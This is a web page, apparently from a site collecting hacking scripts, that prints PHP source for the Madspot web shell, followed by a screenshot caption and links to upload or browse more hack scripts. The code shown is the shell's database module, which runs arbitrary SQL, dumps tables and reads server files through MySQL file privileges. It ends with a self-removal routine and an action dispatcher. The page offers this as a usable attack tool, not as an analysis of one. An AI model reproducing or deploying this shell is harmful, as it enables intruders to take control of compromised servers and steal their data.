<span class="x">                case &quot;KOI8-U&quot;: $db-&amp;gt;setCharset(&#39;koi8u&#39;); break;</span>
<span class="x">                case &quot;cp866&quot;: $db-&amp;gt;setCharset(&#39;cp866&#39;); break;</span>
<span class="x">            }</span>
<span class="x">            if(empty($_POST[&#39;file&#39;])) {</span>
<span class="x">                ob_start(&quot;ob_gzhandler&quot;, 4096);</span>
<span class="x">                header(&quot;Content-Disposition: attachment; filename=dump.sql&quot;);</span>
<span class="x">                header(&quot;Content-Type: text/plain&quot;);</span>
<span class="x">                foreach($_POST[&#39;tbl&#39;] as $v)</span>
<span class="x">                                    $db-&amp;gt;dump($v);</span>
<span class="x">                exit;</span>
<span class="x">            } elseif($fp = @fopen($_POST[&#39;file&#39;], &#39;w&#39;)) {</span>
<span class="x">                foreach($_POST[&#39;tbl&#39;] as $v)</span>
<span class="x">                    $db-&amp;gt;dump($v, $fp);</span>
<span class="x">                fclose($fp);</span>
<span class="x">                unset($_POST[&#39;p2&#39;]);</span>
<span class="x">            } else</span>
<span class="x">                die(&#39;&amp;lt;script&amp;gt;alert(&quot;Error! Can\&#39;t open file&quot;);window.history.back(-1)&amp;lt;/script&amp;gt;&#39;);</span>
<span class="x">            }</span>
<span class="x">            madhead();</span>
<span class="x">            echo &quot;</span>
<span class="x">    &amp;lt;div class=header&amp;gt;</span>
<span class="x">    &amp;lt;form name=&#39;sf&#39; method=&#39;post&#39; onsubmit=&#39;fs(this);&#39;&amp;gt;&amp;lt;table cellpadding=&#39;2&#39; cellspacing=&#39;0&#39;&amp;gt;&amp;lt;tr&amp;gt;</span>
<span class="x">    &amp;lt;td&amp;gt;Type&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;Host&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;Login&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;Password&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;Database&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;</span>
<span class="x">    &amp;lt;input type=hidden name=a value=Sql&amp;gt;&amp;lt;input type=hidden name=p1 value=&#39;query&#39;&amp;gt;&amp;lt;input type=hidden name=p2 value=&#39;&#39;&amp;gt;&amp;lt;input type=hidden name=c value=&#39;&quot;. htmlspecialchars($GLOBALS[&#39;cwd&#39;]) .&quot;&#39;&amp;gt;&amp;lt;input type=hidden name=charset value=&#39;&quot;. (isset($_POST[&#39;charset&#39;])?$_POST[&#39;charset&#39;]:&#39;&#39;) .&quot;&#39;&amp;gt;</span>
<span class="x">    &amp;lt;td&amp;gt;&amp;lt;select name=&#39;type&#39;&amp;gt;&amp;lt;option value=&#39;mysql&#39; &quot;;</span>
<span class="x">        if(@$_POST[&#39;type&#39;]==&#39;mysql&#39;)echo &#39;selected&#39;;</span>
<span class="x">    echo &quot;&amp;gt;MySql&amp;lt;/option&amp;gt;&amp;lt;option value=&#39;pgsql&#39; &quot;;</span>
<span class="x">    if(@$_POST[&#39;type&#39;]==&#39;pgsql&#39;)echo &#39;selected&#39;;</span>
<span class="x">    echo &quot;&amp;gt;PostgreSql&amp;lt;/option&amp;gt;&amp;lt;/select&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">    &amp;lt;td&amp;gt;&amp;lt;input type=text name=sql_host value=&#39;&quot;. (empty($_POST[&#39;sql_host&#39;])?&#39;localhost&#39;:htmlspecialchars($_POST[&#39;sql_host&#39;])) .&quot;&#39;&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">    &amp;lt;td&amp;gt;&amp;lt;input type=text name=sql_login value=&#39;&quot;. (empty($_POST[&#39;sql_login&#39;])?&#39;root&#39;:htmlspecialchars($_POST[&#39;sql_login&#39;])) .&quot;&#39;&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">    &amp;lt;td&amp;gt;&amp;lt;input type=text name=sql_pass value=&#39;&quot;. (empty($_POST[&#39;sql_pass&#39;])?&#39;&#39;:htmlspecialchars($_POST[&#39;sql_pass&#39;])) .&quot;&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&quot;;</span>
<span class="x">            $tmp = &quot;&amp;lt;input type=text name=sql_base value=&#39;&#39;&amp;gt;&quot;;</span>
<span class="x">            if(isset($_POST[&#39;sql_host&#39;])){</span>
<span class="x">                    if($db-&amp;gt;connect($_POST[&#39;sql_host&#39;], $_POST[&#39;sql_login&#39;], $_POST[&#39;sql_pass&#39;], $_POST[&#39;sql_base&#39;])) {</span>
<span class="x">                            switch($_POST[&#39;charset&#39;]) {</span>
<span class="x">                                    case &quot;Windows-1251&quot;: $db-&amp;gt;setCharset(&#39;cp1251&#39;); break;</span>
<span class="x">                                    case &quot;UTF-8&quot;: $db-&amp;gt;setCharset(&#39;utf8&#39;); break;</span>
<span class="x">                                    case &quot;KOI8-R&quot;: $db-&amp;gt;setCharset(&#39;koi8r&#39;); break;</span>
<span class="x">                                    case &quot;KOI8-U&quot;: $db-&amp;gt;setCharset(&#39;koi8u&#39;); break;</span>
<span class="x">                                    case &quot;cp866&quot;: $db-&amp;gt;setCharset(&#39;cp866&#39;); break;</span>
<span class="x">                            }</span>
<span class="x">                            $db-&amp;gt;listDbs();</span>
<span class="x">                            echo &quot;&amp;lt;select name=sql_base&amp;gt;&amp;lt;option value=&#39;&#39;&amp;gt;&amp;lt;/option&amp;gt;&quot;;</span>
<span class="x">                            while($item = $db-&amp;gt;fetch()) {</span>
<span class="x">                                    list($key, $value) = each($item);</span>
<span class="x">                                    echo &#39;&amp;lt;option value=&quot;&#39;.$value.&#39;&quot; &#39;.($value==$_POST[&#39;sql_base&#39;]?&#39;selected&#39;:&#39;&#39;).&#39;&amp;gt;&#39;.$value.&#39;&amp;lt;/option&amp;gt;&#39;;</span>
<span class="x">                            }</span>
<span class="x">                            echo &#39;&amp;lt;/select&amp;gt;&#39;;</span>
<span class="x">                    }</span>
<span class="x">                    else echo $tmp;</span>
<span class="x">            }else</span>
<span class="x">                    echo $tmp;</span>
<span class="x">            echo &quot;&amp;lt;/td&amp;gt;</span>
<span class="x">                                    &amp;lt;td&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39; onclick=&#39;fs(d.sf);&#39;&amp;gt;&amp;lt;/td&amp;gt;</span>
<span class="x">                   &amp;lt;td&amp;gt;&amp;lt;input type=checkbox name=sql_count value=&#39;on&#39;&quot; . (empty($_POST[&#39;sql_count&#39;])?&#39;&#39;:&#39; checked&#39;) . &quot;&amp;gt; count the number of rows&amp;lt;/td&amp;gt;</span>
<span class="x">                            &amp;lt;/tr&amp;gt;</span>
<span class="x">                    &amp;lt;/table&amp;gt;</span>
<span class="x">                    &amp;lt;script&amp;gt;</span>
<span class="x">               s_db=&#39;&quot;.@addslashes($_POST[&#39;sql_base&#39;]).&quot;&#39;;</span>
<span class="x">               function fs(f) {</span>
<span class="x">                   if(f.sql_base.value!=s_db) { f.onsubmit = function() {};</span>
<span class="x">                       if(f.p1) f.p1.value=&#39;&#39;;</span>
<span class="x">                       if(f.p2) f.p2.value=&#39;&#39;;</span>
<span class="x">                       if(f.p3) f.p3.value=&#39;&#39;;</span>
<span class="x">                   }</span>
<span class="x">               }</span>
<span class="x">                            function st(t,l) {</span>
<span class="x">                                    d.sf.p1.value = &#39;select&#39;;</span>
<span class="x">                                    d.sf.p2.value = t;</span>
<span class="x">                   if(l &amp;&amp; d.sf.p3) d.sf.p3.value = l;</span>
<span class="x">                                    d.sf.submit();</span>
<span class="x">                            }</span>
<span class="x">                            function is() {</span>
<span class="x">                                    for(i=0;i&amp;lt;d.sf.elements[&#39;tbl[]&#39;].length;++i)</span>
<span class="x">                                            d.sf.elements[&#39;tbl[]&#39;][i].checked = !d.sf.elements[&#39;tbl[]&#39;][i].checked;</span>
<span class="x">                            }</span>
<span class="x">                    &amp;lt;/script&amp;gt;&quot;;</span>
<span class="x">            if(isset($db) &amp;&amp; $db-&amp;gt;link){</span>
<span class="x">                    echo &quot;&amp;lt;br/&amp;gt;&amp;lt;table width=100% cellpadding=2 cellspacing=0&amp;gt;&quot;;</span>
<span class="x">                            if(!empty($_POST[&#39;sql_base&#39;])){</span>
<span class="x">                                    $db-&amp;gt;selectdb($_POST[&#39;sql_base&#39;]);</span>
<span class="x">                                    echo &quot;&amp;lt;tr&amp;gt;&amp;lt;td width=1 style=&#39;border-top:2px solid #666;&#39;&amp;gt;&amp;lt;span&amp;gt;Tables:&amp;lt;/span&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;;</span>
<span class="x">                                    $tbls_res = $db-&amp;gt;listTables();</span>
<span class="x">                                    while($item = $db-&amp;gt;fetch($tbls_res)) {</span>
<span class="x">                                            list($key, $value) = each($item);</span>
<span class="x">                        if(!empty($_POST[&#39;sql_count&#39;]))</span>
<span class="x">                            $n = $db-&amp;gt;fetch($db-&amp;gt;query(&#39;SELECT COUNT(*) as n FROM &#39;.$value.&#39;&#39;));</span>
<span class="x">                                            $value = htmlspecialchars($value);</span>
<span class="x">                                            echo &quot;&amp;lt;nobr&amp;gt;&amp;lt;input type=&#39;checkbox&#39; name=&#39;tbl[]&#39; value=&#39;&quot;.$value.&quot;&#39;&amp;gt;&amp;nbsp;&amp;lt;a href=# onclick=\&quot;st(&#39;&quot;.$value.&quot;&#39;,1)\&quot;&amp;gt;&quot;.$value.&quot;&amp;lt;/a&amp;gt;&quot; . (empty($_POST[&#39;sql_count&#39;])?&#39;&amp;nbsp;&#39;:&quot; &amp;lt;small&amp;gt;({$n[&#39;n&#39;]})&amp;lt;/small&amp;gt;&quot;) . &quot;&amp;lt;/nobr&amp;gt;&amp;lt;br&amp;gt;&quot;;</span>
<span class="x">                                    }</span>
<span class="x">                                    echo &quot;&amp;lt;input type=&#39;checkbox&#39; onclick=&#39;is();&#39;&amp;gt; &amp;lt;input type=button value=&#39;Dump&#39; onclick=&#39;document.sf.p2.value=\&quot;download\&quot;;document.sf.submit();&#39;&amp;gt;&amp;lt;br&amp;gt;File path:&amp;lt;input type=text name=file value=&#39;dump.sql&#39;&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td style=&#39;border-top:2px solid #666;&#39;&amp;gt;&quot;;</span>
<span class="x">                                    if(@$_POST[&#39;p1&#39;] == &#39;select&#39;) {</span>
<span class="x">                                            $_POST[&#39;p1&#39;] = &#39;query&#39;;</span>
<span class="x">                        $_POST[&#39;p3&#39;] = $_POST[&#39;p3&#39;]?$_POST[&#39;p3&#39;]:1;</span>
<span class="x">                                            $db-&amp;gt;query(&#39;SELECT COUNT(*) as n FROM &#39; . $_POST[&#39;p2&#39;]);</span>
<span class="x">                                            $num = $db-&amp;gt;fetch();</span>
<span class="x">                                            $pages = ceil($num[&#39;n&#39;] / 30);</span>
<span class="x">                        echo &quot;&amp;lt;script&amp;gt;d.sf.onsubmit=function(){st(\&quot;&quot; . $_POST[&#39;p2&#39;] . &quot;\&quot;, d.sf.p3.value)}&amp;lt;/script&amp;gt;&amp;lt;span&amp;gt;&quot;.$_POST[&#39;p2&#39;].&quot;&amp;lt;/span&amp;gt; ({$num[&#39;n&#39;]} records) Page # &amp;lt;input type=text name=&#39;p3&#39; value=&quot; . ((int)$_POST[&#39;p3&#39;]) . &quot;&amp;gt;&quot;;</span>
<span class="x">                        echo &quot; of $pages&quot;;</span>
<span class="x">                        if($_POST[&#39;p3&#39;] &amp;gt; 1)</span>
<span class="x">                            echo &quot; &amp;lt;a href=# onclick=&#39;st(\&quot;&quot; . $_POST[&#39;p2&#39;] . &#39;&quot;, &#39; . ($_POST[&#39;p3&#39;]-1) . &quot;)&#39;&amp;gt;&amp;lt; Prev&amp;lt;/a&amp;gt;&quot;;</span>
<span class="x">                        if($_POST[&#39;p3&#39;] &amp;lt; $pages)</span>
<span class="x">                            echo &quot; &amp;lt;a href=# onclick=&#39;st(\&quot;&quot; . $_POST[&#39;p2&#39;] . &#39;&quot;, &#39; . ($_POST[&#39;p3&#39;]+1) . &quot;)&#39;&amp;gt;Next &amp;gt;&amp;lt;/a&amp;gt;&quot;;</span>
<span class="x">                        $_POST[&#39;p3&#39;]--;</span>
<span class="x">                                            if($_POST[&#39;type&#39;]==&#39;pgsql&#39;)</span>
<span class="x">                                                    $_POST[&#39;p2&#39;] = &#39;SELECT * FROM &#39;.$_POST[&#39;p2&#39;].&#39; LIMIT 30 OFFSET &#39;.($_POST[&#39;p3&#39;]*30);</span>
<span class="x">                                            else</span>
<span class="x">                                                    $_POST[&#39;p2&#39;] = &#39;SELECT * FROM `&#39;.$_POST[&#39;p2&#39;].&#39;` LIMIT &#39;.($_POST[&#39;p3&#39;]*30).&#39;,30&#39;;</span>
<span class="x">                                            echo &quot;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&quot;;</span>
<span class="x">                                    }</span>
<span class="x">                                    if((@$_POST[&#39;p1&#39;] == &#39;query&#39;) &amp;&amp; !empty($_POST[&#39;p2&#39;])) {</span>
<span class="x">                                            $db-&amp;gt;query(@$_POST[&#39;p2&#39;]);</span>
<span class="x">                                            if($db-&amp;gt;res !== false) {</span>
<span class="x">                                                    $title = false;</span>
<span class="x">                                                    echo &#39;&amp;lt;table width=100% cellspacing=1 cellpadding=2 class=main style=&quot;background-color:#292929&quot;&amp;gt;&#39;;</span>
<span class="x">                                                    $line = 1;</span>
<span class="x">                                                    while($item = $db-&amp;gt;fetch())     {</span>
<span class="x">                                                            if(!$title)     {</span>
<span class="x">                                                                    echo &#39;&amp;lt;tr&amp;gt;&#39;;</span>
<span class="x">                                                                    foreach($item as $key =&amp;gt; $value)</span>
<span class="x">                                                                            echo &#39;&amp;lt;th&amp;gt;&#39;.$key.&#39;&amp;lt;/th&amp;gt;&#39;;</span>
<span class="x">                                                                    reset($item);</span>
<span class="x">                                                                    $title=true;</span>
<span class="x">                                                                    echo &#39;&amp;lt;/tr&amp;gt;&amp;lt;tr&amp;gt;&#39;;</span>
<span class="x">                                                                    $line = 2;</span>
<span class="x">                                                            }</span>
<span class="x">                                                            echo &#39;&amp;lt;tr class=&quot;l&#39;.$line.&#39;&quot;&amp;gt;&#39;;</span>
<span class="x">                                                            $line = $line==1?2:1;</span>
<span class="x">                                                            foreach($item as $key =&amp;gt; $value) {</span>
<span class="x">                                                                    if($value == null)</span>
<span class="x">                                                                            echo &#39;&amp;lt;td&amp;gt;&amp;lt;i&amp;gt;null&amp;lt;/i&amp;gt;&amp;lt;/td&amp;gt;&#39;;</span>
<span class="x">                                                                    else</span>
<span class="x">                                                                            echo &#39;&amp;lt;td&amp;gt;&#39;.nl2br(htmlspecialchars($value)).&#39;&amp;lt;/td&amp;gt;&#39;;</span>
<span class="x">                                                            }</span>
<span class="x">                                                            echo &#39;&amp;lt;/tr&amp;gt;&#39;;</span>
<span class="x">                                                    }</span>
<span class="x">                                                    echo &#39;&amp;lt;/table&amp;gt;&#39;;</span>
<span class="x">                                            } else {</span>
<span class="x">                                                    echo &#39;&amp;lt;div&amp;gt;&amp;lt;b&amp;gt;Error:&amp;lt;/b&amp;gt; &#39;.htmlspecialchars($db-&amp;gt;error()).&#39;&amp;lt;/div&amp;gt;&#39;;</span>
<span class="x">                                            }</span>
<span class="x">                                    }</span>
<span class="x">                                    echo &quot;&amp;lt;br&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;form onsubmit=&#39;d.sf.p1.value=\&quot;query\&quot;;d.sf.p2.value=this.query.value;document.sf.submit();return false;&#39;&amp;gt;&amp;lt;textarea name=&#39;query&#39; style=&#39;width:100%;height:100px&#39;&amp;gt;&quot;;</span>
<span class="x">                    if(!empty($_POST[&#39;p2&#39;]) &amp;&amp; ($_POST[&#39;p1&#39;] != &#39;loadfile&#39;))</span>
<span class="x">                        echo htmlspecialchars($_POST[&#39;p2&#39;]);</span>
<span class="x">                    echo &quot;&amp;lt;/textarea&amp;gt;&amp;lt;br/&amp;gt;&amp;lt;input type=submit value=&#39;Execute&#39;&amp;gt;&quot;;</span>
<span class="x">                                    echo &quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&quot;;</span>
<span class="x">                            }</span>
<span class="x">                            echo &quot;&amp;lt;/table&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;br/&amp;gt;&quot;;</span>
<span class="x">                if($_POST[&#39;type&#39;]==&#39;mysql&#39;) {</span>
<span class="x">                    $db-&amp;gt;query(&quot;SELECT 1 FROM mysql.user WHERE concat(`user`, &#39;@&#39;, `host`) = USER() AND `File_priv` = &#39;y&#39;&quot;);</span>
<span class="x">                    if($db-&amp;gt;fetch())</span>
<span class="x">                        echo &quot;&amp;lt;form onsubmit=&#39;d.sf.p1.value=\&quot;loadfile\&quot;;document.sf.p2.value=this.f.value;document.sf.submit();return false;&#39;&amp;gt;&amp;lt;span&amp;gt;Load file&amp;lt;/span&amp;gt; &amp;lt;input  class=&#39;toolsInp&#39; type=text name=f&amp;gt;&amp;lt;input type=submit value=&#39;&amp;gt;&amp;gt;&#39;&amp;gt;&amp;lt;/form&amp;gt;&quot;;</span>
<span class="x">                }</span>
<span class="x">                            if(@$_POST[&#39;p1&#39;] == &#39;loadfile&#39;) {</span>
<span class="x">                                    $file = $db-&amp;gt;loadFile($_POST[&#39;p2&#39;]);</span>
<span class="x">                                    echo &#39;&amp;lt;pre class=ml1&amp;gt;&#39;.htmlspecialchars($file[&#39;file&#39;]).&#39;&amp;lt;/pre&amp;gt;&#39;;</span>
<span class="x">                            }</span>
<span class="x">            } else {</span>
<span class="x">            echo htmlspecialchars($db-&amp;gt;error());</span>
<span class="x">        }</span>
<span class="x">            echo &#39;&amp;lt;/div&amp;gt;&#39;;</span>
<span class="x">        madfooter();</span>

<span class="x">     }</span>

<span class="x">     function madselfrm()</span>
<span class="x">     {</span>

<span class="x">        if($_POST[&#39;p1&#39;] == &#39;yes&#39;)</span>
<span class="x">                    if(@unlink(preg_replace(&#39;!\(\d+\)\s.*!&#39;, &#39;&#39;, __FILE__)))</span>
<span class="x">                            die(&#39;Shell has been removed&#39;);</span>
<span class="x">                    else</span>
<span class="x">                            echo &#39;unlink error!&#39;;</span>
<span class="x">        if($_POST[&#39;p1&#39;] != &#39;yes&#39;)</span>
<span class="x">            madhead();</span>
<span class="x">            echo &quot;&amp;lt;div class=header&amp;gt;&amp;lt;pre class=ml1 style=&#39;margin-top:5px&#39;&amp;gt;&quot;;</span>


<span class="x">        echo &quot;</span>

<span class="x">                   /^\</span>
<span class="x">          _.-`:   /   \   :&#39;-._</span>
<span class="x">        ,`    :  |     |  :    &#39;.</span>
<span class="x">      ,`       \,|     |,/       &#39;.</span>
<span class="x">     /           `-...-`           \</span>
<span class="x">    :              .&#39;.              :</span>
<span class="x">    |             . &#39; .             |</span>
<span class="x">    |             &#39; . &#39;             |</span>
<span class="x">    :              &#39;.&#39;              :</span>
<span class="x">     \           ,-&#39;&#39;&#39;-,           /</span>
<span class="x">      `.       /&#39;|     |&#39;\       ,&#39;</span>
<span class="x">        `._   ;  |     |  ;   _,&#39;</span>
<span class="x">           `-.:  |     |  :,-&#39;</span>
<span class="x">                 |     |</span>
<span class="x">                 |     |</span>
<span class="x">                 |     |</span>
<span class="x">                 |     |</span>
<span class="x">                 |     |</span>
<span class="x">    &quot;;</span>



<span class="x">        echo &#39;&amp;lt;br&amp;gt;Kill Me?&amp;lt;br&amp;gt;&amp;lt;a href=# onclick=&quot;g(null,null,\&#39;yes\&#39;)&quot;&amp;gt;Yes&amp;lt;/a&amp;gt;&amp;lt;/div&amp;gt;&#39;;</span>
<span class="x">            madFooter();</span>

<span class="x">     }</span>


<span class="x">    if( empty($_POST[&#39;a&#39;]) )</span>
<span class="x">            if(isset($default_action) &amp;&amp; function_exists(&#39;mad&#39; . $default_action))</span>
<span class="x">                    $_POST[&#39;a&#39;] = $default_action;</span>
<span class="x">            else</span>
<span class="x">                    $_POST[&#39;a&#39;] = &#39;FilesMan&#39;;</span>
<span class="x">    if( !empty($_POST[&#39;a&#39;]) &amp;&amp; function_exists(&#39;mad&#39; . $_POST[&#39;a&#39;]) )</span>
<span class="x">            call_user_func(&#39;mad&#39; . $_POST[&#39;a&#39;]);</span>
<span class="x">            exit;</span>
<span class="x">    ?&amp;gt;</span></code></pre></div>

<p>A screenshot of Madspot Shell in action.<br>
<figure id="attachment_380" style="width: 604px;" class="wp-caption aligncenter"><a href="/HackingScripts/wp-content/uploads/2014/03/madspot-shell.png"><img src="/HackingScripts/wp-content/uploads/2014/03/madspot-shell-1024x540.png" alt="madspot shell screenshot" width="604" height="318" class="size-large wp-image-380" /></a><figcaption class="wp-caption-text">Screenshot of the Madspot shell</figcaption></figure></p>



        </section>

        <aside id="sidebar">
          <a href="/HackingScripts/upload/" class="button">
            <small>Upload</small>
            a file
          </a>


          <a href="/HackingScripts/scripts/" class="button">
            <small>The entire list of</small>
            hack scripts
          </a>
          <!--
          <p class="repo-owner"><a href="https://github.com/jasonlong/architect-theme">architect-theme</a> is maintained by <a href="https://github.com/jasonlong">jasonlong</a>.</p>

          <p class="repo-owner"><a href="https://github.com/pietromenna/jekyll-architect-theme">jekyll-architect-theme</a> is maintained by <a href="https://github.com/pietromenna">pietromenna</a>.</p>

          <p>This page was generated by <a href="https://pages.github.com">GitHub Pages</a> using the Architect theme by <a href="https://twitter.com/jasonlong">Jason Long</a>.</p>
      -->
        </aside>

      </div>
    </div>

  </body>
</html>
